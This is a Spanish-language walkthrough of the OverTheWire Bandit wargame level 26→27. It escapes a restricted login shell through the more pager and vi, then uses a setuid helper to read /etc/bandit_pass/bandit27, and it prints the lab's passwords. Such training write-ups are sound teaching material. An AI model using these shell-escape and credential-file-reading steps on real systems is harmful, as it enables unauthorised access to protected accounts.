## Objetivo:
Good job getting a shell! Now hurry and grab the password for bandit27!

## Datos de acceso al nivel:
- **Host: bandit.labs.overthewire.org** 
- **Port:** 2220
- **User:** bandit26
- **Password:** c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1

## Solución:
Nos intentamos conectar a bandit26:
Cuando nos intentamos conectar a bandit26 nos saca ya que el reto nos indica que `bandit26` no utiliza la shell `/bin/bash`, por lo tanto realizamos lo mismo que el reto pasado usando more y vi para agregar una variable.

Cuando vemos `--More--(x%)` podemos usar la tecla `v` para ingresar al modo de edición de `vi`.
-  Ahora podemos ingresar variables en este usando `:set shell=/bin/bash`
-  Una vez configurada la variable que llamará una shell `/bin/bash`, corremos la variable `shell`.

```bash
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         :set shell=/bin/bash
```

```bash
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         ~                                                                                         :shell
bandit26@bandit:~$
```

Ahora que ya estamos dentro de `bandit26` mostramos la password del nivel 27.
- Revisamos que tiene el directorio local, y este posee un `setuid` para ejecutar comandos como `bandit27`:

```bash
bandit26@bandit:~$ ls -l
total 20
-rwsr-x--- 1 bandit27 bandit26 14876 Feb 21 22:03 bandit27-do
-rw-r----- 1 bandit26 bandit26   258 Feb 21 22:03 text.txt
bandit26@bandit:~$
```

Por lo tanto, ahora podemos ver la password del próximo reto:

```bash
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
bandit26@bandit:~$
```

## Notas adicionales:

#### Permiso setuid
- Cuando el permiso `setuid` se establece en un archivo ejecutable, se otorga acceso a un proceso que ejecuta este archivo según el propietario del archivo. El acceso **no** se basa en el usuario que está ejecutando el archivo ejecutable. Este permiso especial permite a un usuario acceder a los archivos y directorios que, normalmente, están disponibles sólo para el propietario. 

## Referencias:
- https://es.wikipedia.org/wiki/More_(comando)
- https://es.wikipedia.org/wiki/Vi